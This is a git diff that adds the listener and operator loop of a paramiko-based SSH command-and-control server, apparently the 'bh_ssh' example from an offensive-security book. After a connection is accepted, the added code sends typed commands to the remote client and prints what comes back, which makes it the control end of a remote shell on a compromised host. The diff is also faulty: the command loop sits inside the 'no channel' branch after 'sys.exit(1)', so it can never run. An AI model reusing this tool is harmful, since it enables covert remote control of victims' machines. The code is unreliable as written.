@@ -33,3 +33,32 @@ if __name__ == '__main__':
     except Exception as e:
         print('[-] Listen failed: ' + str(e))
         sys.exit(1)
+    else: 
+        print('[+] Got a connection!', client, addr)
+    
+    bhSession = paramiko.Transport(client) # 4
+    bhSession.add_server_key(HOSTKEY)
+    server = Server()
+    bhSession.start_server(server=server)
+
+    chan = bhSession.accept(20)
+    if chan is None:
+        print('*** No channel.')
+        sys.exit(1)
+        print('[+] Authenticated!') # 5
+        print(chan.recv(1024)) # 6
+        chan.send('Welcome to bh_ssh')
+        try:
+            while True:
+                command = input("Enter command: ")
+                if command != 'exit':
+                    chan.send(command)
+                    r = chan.recv(8192)
+                    print(r.decode())
+                else:
+                    chan.send('exit')
+                    print('exiting')
+                    bhSession.close()
+                    break
+        except KeyboardInterrupt:
+            bhSession.close()
